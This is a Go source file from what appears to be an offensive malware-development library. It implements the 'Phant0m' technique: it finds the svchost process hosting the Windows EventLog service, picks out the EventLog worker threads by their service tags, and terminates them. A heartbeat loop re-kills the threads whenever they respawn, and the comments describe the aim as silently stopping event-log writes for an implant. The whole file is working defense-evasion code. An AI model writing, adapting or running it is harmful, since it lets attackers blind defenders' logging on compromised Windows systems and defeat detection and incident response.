//go:build windows

package phant0m

import (
	"context"
	"errors"
	"fmt"
	"strings"
	"sync"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"

	"github.com/oioio-space/maldev/process/enum"
	"github.com/oioio-space/maldev/win/api"
	wsyscall "github.com/oioio-space/maldev/win/syscall"
)

// ErrNoTargetThreads is returned by Kill when no EventLog worker threads
// could be identified or terminated.
var ErrNoTargetThreads = errors.New("no target threads found")

// threadQuerySetWin32StartAddress is the THREAD_INFORMATION_CLASS value
// for NtQueryInformationThread that retrieves the thread's Win32 start
// address. For svchost-hosted service threads, this also exposes the
// SubProcessTag used for service tag resolution.
const threadQuerySetWin32StartAddress = 9

var (
	tagQueryOnce      sync.Once
	tagQueryAvailable bool
)

func canQueryTags() bool {
	tagQueryOnce.Do(func() {
		tagQueryAvailable = api.ProcI_QueryTagInformation.Find() == nil
	})
	return tagQueryAvailable
}

// isEventLogThread checks whether a thread (identified by its TID) in the
// given process belongs to the EventLog service by reading its service tag
// from the TEB and resolving it via I_QueryTagInformation.
//
// Returns true if the thread is confirmed to be an EventLog worker, or if
// service tag validation is unavailable (graceful fallback).
func isEventLogThread(hProcess windows.Handle, pid, tid uint32) bool {
	if !canQueryTags() {
		return true
	}

	const threadQueryInformation = 0x0040
	hThread, err := windows.OpenThread(threadQueryInformation, false, tid)
	if err != nil {
		return true
	}
	defer windows.CloseHandle(hThread)

	// Read the SubProcessTag from the TEB. The tag is at TEB offset 0x1720 (x64).
	// First get the TEB address via NtQueryInformationThread(ThreadBasicInformation=0).
	type threadBasicInfo struct {
		ExitStatus                   int32
		_                            [4]byte // padding
		TebBaseAddress               uintptr
		ClientID                     [2]uintptr // UniqueProcess, UniqueThread
		AffinityMask                 uintptr
		Priority                     int32
		BasePriority                 int32
	}
	var tbi threadBasicInfo
	r, _, _ := api.ProcNtQueryInformationThread.Call(
		uintptr(hThread),
		0, // ThreadBasicInformation
		uintptr(unsafe.Pointer(&tbi)),
		unsafe.Sizeof(tbi),
		0,
	)
	if r != 0 || tbi.TebBaseAddress == 0 {
		return false
	}

	// Read SubProcessTag (ULONG) from TEB+0x1720 via ReadProcessMemory.
	var tag uint32
	var bytesRead uintptr
	const tebSubProcessTagOffset = 0x1720 // x64 TEB offset for SubProcessTag
	err = windows.ReadProcessMemory(hProcess,
		tbi.TebBaseAddress+tebSubProcessTagOffset,
		(*byte)(unsafe.Pointer(&tag)), 4, &bytesRead)
	if err != nil || tag == 0 {
		return false
	}

	// Build the query struct for I_QueryTagInformation.
	// Type must be 1 (ServiceNameFromTagInformation) — embedded as the third
	// DWORD in the structure.
	type tagQuery struct {
		ProcessID  uint32
		ServiceTag uint32
		TagType    uint32
		Buffer     unsafe.Pointer
	}
	q := tagQuery{
		ProcessID:  pid,
		ServiceTag: uint32(tag),
		TagType:    1, // ServiceNameFromTagInformation
	}

	r, _, _ = api.ProcI_QueryTagInformation.Call(
		0, // reserved
		1, // ServiceNameFromTagInformation
		uintptr(unsafe.Pointer(&q)),
	)
	if r != 0 || q.Buffer == nil {
		return false
	}

	// Buffer points to a wide string allocated by I_QueryTagInformation.
	svcName := windows.UTF16PtrToString((*uint16)(q.Buffer))
	windows.LocalFree(windows.Handle(uintptr(q.Buffer)))
	return strings.EqualFold(svcName, "EventLog")
}

// Kill terminates threads belonging to the Windows Event Log service.
// On modern Windows (Vista+), each thread's service tag is validated via
// I_QueryTagInformation so that only EventLog worker threads are killed,
// leaving other services in the same svchost.exe process unaffected.
// If tag validation is unavailable, all threads of the EventLog PID are killed.
//
// The service process (svchost.exe) continues running but its worker threads
// are killed, silently stopping all event log writes.
//
// Requires SeDebugPrivilege (typically available to SYSTEM or elevated admin).
func Kill(caller *wsyscall.Caller) error {
	pid, err := findEventLogPID()
	if err != nil {
		return fmt.Errorf("find EventLog PID: %w", err)
	}

	tids, err := enum.Threads(pid)
	if err != nil {
		return fmt.Errorf("enumerate threads: %w", err)
	}

	// Open the process once for ReadProcessMemory (TEB tag resolution).
	hProcess, err := windows.OpenProcess(windows.PROCESS_VM_READ, false, pid)
	if err != nil {
		return fmt.Errorf("open EventLog process: %w", err)
	}
	defer windows.CloseHandle(hProcess)

	killed := 0
	for _, tid := range tids {
		if !isEventLogThread(hProcess, pid, tid) {
			continue
		}
		hThread, openErr := windows.OpenThread(windows.THREAD_TERMINATE, false, tid)
		if openErr != nil {
			continue
		}
		if caller != nil {
			ret, _ := caller.Call("NtTerminateThread", uintptr(hThread), 0)
			if ret == 0 {
				killed++
			}
		} else {
			r, _, _ := api.ProcTerminateThread.Call(uintptr(hThread), 0)
			if r != 0 {
				killed++
			}
		}
		windows.CloseHandle(hThread)
	}

	if killed == 0 {
		return ErrNoTargetThreads
	}
	return nil
}

// Heartbeat runs [Kill] once, then re-runs it every `interval` until
// `ctx` is done. The Service Control Manager and the WMI service
// re-spawn EventLog worker threads when the host svchost detects them
// missing — without a heartbeat, the silence window collapses within
// seconds. Heartbeat keeps re-killing as long as the implant cares.
//
// The first call's error is returned to the caller (so operators know
// straight away when SeDebugPrivilege isn't available, the EventLog
// service is missing, etc.). Subsequent kill errors are silently
// retried — they are typically transient (e.g., the threads list
// is being repopulated). When `ctx` is cancelled the function returns
// `ctx.Err()`.
//
// Pass any `interval` ≥ 100 ms; smaller values pin a CPU on the
// thread-enumeration loop with no operational benefit. A typical
// value is 1–5 seconds.
//
// Requires SeDebugPrivilege (same as Kill).
func Heartbeat(ctx context.Context, interval time.Duration, caller *wsyscall.Caller) error {
	if interval <= 0 {
		return fmt.Errorf("phant0m: Heartbeat interval must be > 0 (got %s)", interval)
	}
	if err := Kill(caller); err != nil {
		return err
	}
	t := time.NewTicker(interval)
	defer t.Stop()
	for {
		select {
		case <-ctx.Done():
			return ctx.Err()
		case <-t.C:
			_ = Kill(caller)
		}
	}
}

// findEventLogPID finds the PID of the svchost.exe instance hosting EventLog.
func findEventLogPID() (uint32, error) {
	scm, err := windows.OpenSCManager(nil, nil, windows.SC_MANAGER_CONNECT)
	if err != nil {
		return 0, fmt.Errorf("OpenSCManager: %w", err)
	}
	defer windows.CloseServiceHandle(scm)

	svcName, _ := windows.UTF16PtrFromString("EventLog")
	svc, err := windows.OpenService(scm, svcName, windows.SERVICE_QUERY_STATUS)
	if err != nil {
		return 0, fmt.Errorf("OpenService EventLog: %w", err)
	}
	defer windows.CloseServiceHandle(svc)

	var needed uint32
	var ssp windows.SERVICE_STATUS_PROCESS
	err = windows.QueryServiceStatusEx(svc, windows.SC_STATUS_PROCESS_INFO,
		(*byte)(unsafe.Pointer(&ssp)), uint32(unsafe.Sizeof(ssp)), &needed)
	if err != nil {
		return 0, fmt.Errorf("QueryServiceStatusEx: %w", err)
	}

	if ssp.ProcessId == 0 {
		return 0, fmt.Errorf("EventLog service not running")
	}
	return ssp.ProcessId, nil
}
